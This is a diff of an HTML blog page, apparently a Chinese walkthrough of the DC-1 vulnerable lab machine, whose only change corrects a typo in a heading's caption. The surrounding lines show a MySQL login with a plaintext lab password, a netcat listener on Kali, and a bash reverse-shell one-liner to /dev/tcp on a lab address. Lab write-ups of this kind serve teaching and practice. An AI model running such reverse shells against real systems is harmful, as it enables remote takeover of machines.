@@ -551,7 +551,7 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><code>由于这个shell是http方式建立的，不是持久连接，所以下面建立持久连接</code></p>
-<h2 id="0x07-反弹shell"><a href="#0x07-反弹shell" class="headerlink" title="0x07.反弹shell"></a>0x07.反弹shell</h2><p><code>由于需要简历持久连接，所以尝试将DC1的shell反弹给kali</code></p>
+<h2 id="0x07-反弹shell"><a href="#0x07-反弹shell" class="headerlink" title="0x07.反弹shell"></a>0x07.反弹shell</h2><p><code>由于需要建立持久连接，所以尝试将DC1的shell反弹给kali</code></p>
 <h3 id="1-kali先监听6666端口"><a href="#1-kali先监听6666端口" class="headerlink" title="1.kali先监听6666端口"></a>1.kali先监听6666端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h3 id="2-DC1执行"><a href="#2-DC1执行" class="headerlink" title="2.DC1执行"></a>2.DC1执行</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
